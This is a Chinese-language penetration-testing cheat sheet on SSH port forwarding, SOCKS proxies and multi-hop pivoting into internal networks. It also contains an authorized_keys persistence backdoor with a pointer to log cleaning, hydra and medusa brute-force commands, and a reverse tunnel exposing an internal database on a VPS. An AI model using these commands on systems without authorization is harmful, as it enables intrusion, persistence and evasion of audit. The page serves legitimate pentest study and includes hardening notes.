---
title: SSH 端口转发与代理
aliases: [SSH 隧道, 端口转发, 动态代理, ssh -D]
category: penetration
status: current
updated: 2026-07
---

# SSH 端口转发与 SOCKS 代理

## 0x01 概述

SSH 是最稳的隧道工具之一，适合在已拿到服务器 SSH 凭证后快速建立：

- 本地转发
- 远程转发
- 动态代理（SOCKS）
- 跳板链路

> 无 SSH 凭证、仅有 Webshell/主机立足点时，改用 [内网穿透工具](./PEN-Tunnel.md)（frp/chisel/Neo-reGeorg）。

## 0x02 本地转发

本地访问 `127.0.0.1:80`，流量通过 SSH 主机转发到远端的 `127.0.0.1:8888`：

```bash
ssh -CfNg -L 80:127.0.0.1:8888 user@1.1.1.1
```

常见用途：

- 访问远端仅本地监听的 Web 服务。
- 透过跳板机访问内网单点服务。

## 0x03 远程转发

远端访问 `1.1.1.1:80`，流量回连到本地 `127.0.0.1:8888`：

```bash
ssh -CfNg -R 80:127.0.0.1:8888 user@1.1.1.1
```

常见用途：

- 把本地服务映射到远程跳板机。
- 让远程主机反向访问你的监听端口。

如果需要让其他主机也能访问远程映射端口，通常还要在服务端开启 `GatewayPorts yes`。

## 0x04 动态代理

在本地开启一个 SOCKS5 代理：

```bash
ssh -qTfnN -D 0.0.0.0:1080 root@1.1.1.1
```

此时代理地址为：

```text
127.0.0.1:1080
```

适合交给浏览器、Burp、Proxychains、tun2socks 使用。

## 0x05 SSH 参数速查表

- `-L`：本地转发
- `-R`：远程转发
- `-D`：动态代理
- `-N`：不执行远程命令
- `-f`：认证后转到后台
- `-C`：开启压缩
- `-g`：允许远端主机访问本地转发端口

补充渗透常用参数：

- `-o ServerAliveInterval=20`：每 20 秒发送保活包，防止 NAT 超时导致隧道假死
- `-p 端口`：指定目标 SSH 端口（改过端口的目标必带，如 `-p 2222`）
- `-i 密钥`：指定私钥文件登录（如 `-i id_rsa`，配合免密后门使用）

## 0x06 跳板用法

### 1. `ProxyJump`

```bash
ssh -J user1@jump-host user2@target-host
```

### 2. 多级端口转发

当只有一台边界主机能访问内网时，可以先连边界主机，再用本地转发把内网服务拉到本地。

## 0x07 排错思路

### 1. 端口没有监听

先检查本地是否真的起来了：

```bash
netstat -ano | findstr 1080
```

### 2. 远程转发失败

检查服务端配置：

- `AllowTcpForwarding yes`
- `GatewayPorts yes`

### 3. 流量能连但访问不到服务

重点确认：

- 目标服务是否只绑定到 `127.0.0.1`
- 安全组、防火墙是否放行
- 转发目标 IP 和端口是否写反

## 0x08 注意事项

- SSH 登录和转发通常会留下认证与会话日志，不要假设“完全无日志”。
- `-D 0.0.0.0:1080` 会把代理暴露给其他主机，非必要不要这样开。
- 做多级跳板时，优先记录每一跳的入口和出口，避免路由绕乱。

## 0x09 实战场景对照

### 场景 1：拿到外网 Linux 跳板机 → 本地转发进内网 Web

```bash
# 跳板机出网且已拿到 SSH 凭据，把内网 10.0.0.5 的 Web 服务拉到本地 8080
ssh -CfNg -L 8080:10.0.0.5:80 user@跳板
# 本地浏览器访问 127.0.0.1:8080 即等于直接访问内网 10.0.0.5:80
```

### 场景 2：内网数据库不出网 → 远程转发到公网 VPS

```bash
# 内网机器能主动 SSH 连出，把内网 3306 反向映射到公网 VPS 的 3306
ssh -CfNg -R 3306:127.0.0.1:3306 user@vps
# VPS 侧需开启 GatewayPorts yes，其他主机才能访问该映射端口
```

### 场景 3：SOCKS5 打内网段

```bash
# 在本地起 SOCKS5 代理，所有流量经跳板机进出内网
ssh -CfNg -D 1080 user@跳板
# 配合 proxychains 让任意工具走代理（proxychains.conf 指向 127.0.0.1:1080）
proxychains nmap -sT -Pn -p 80,445 10.0.0.0/24
```

### 场景 4：多层跳板链

```bash
# ProxyJump 一条命令串起多跳，自动逐层建立加密通道
ssh -J user1@hop1,user2@hop2 user@target
# 替代旧式多级 -L 串联：先连 hop1 再套 -L、再从 hop1 连 hop2 套 -L，层层嵌套容易绕乱
```

## 0x10 密钥登录与弱凭据

### 1. 免密后门（持久化）

```bash
# 本地生成密钥对（一路回车，也可在目标机上直接生成）
ssh-keygen -t rsa
# 把公钥追加到目标 authorized_keys，之后即可免密登录
cat id_rsa.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

> 公钥后门不触发密码策略审计，但会在 authorized_keys 留下痕迹，配合 [Linux 痕迹清理](./PEN-LinuxClear.md) 使用。

### 2. 弱口令爆破

```bash
# hydra 多线程爆破 SSH
hydra -L users.txt -P pass.txt ssh://1.1.1.1
# medusa 一句话
medusa -H hosts.txt -U users.txt -P pass.txt -M ssh
```

### 3. sshd 配置加固要点（防御视角）

```text
PermitRootLogin no          # 禁止 root 直接登录
PasswordAuthentication no   # 强制密钥登录，杜绝弱口令爆破
MaxAuthTries 3              # 限制单次连接认证尝试次数
```

## 0x11 autossh 与断线重连

SSH 隧道在 NAT 超时、网络抖动下容易假死，autossh 会持续监测并自动重建隧道：

```bash
# -M 10999 指定监控端口，隧道断开后自动重连
autossh -M 10999 -CfNg -D 1080 user@跳板
# 建议叠加保活参数，效果更稳
autossh -M 10999 -CfNg -D 1080 -o ServerAliveInterval=20 user@跳板
```

> 无 SSH 凭证、或需要多路复用更稳的自动重连时，可改用 frp 等内网穿透工具（自带断线重连），见 [内网穿透工具](./PEN-Tunnel.md)。

## Ref

- https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html
- https://man.openbsd.org/ssh
- https://man.openbsd.org/sshd （OpenSSH 官方手册：sshd_config 加固项）
- https://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html （SSH 隧道图解：本地/远程/动态转发原理）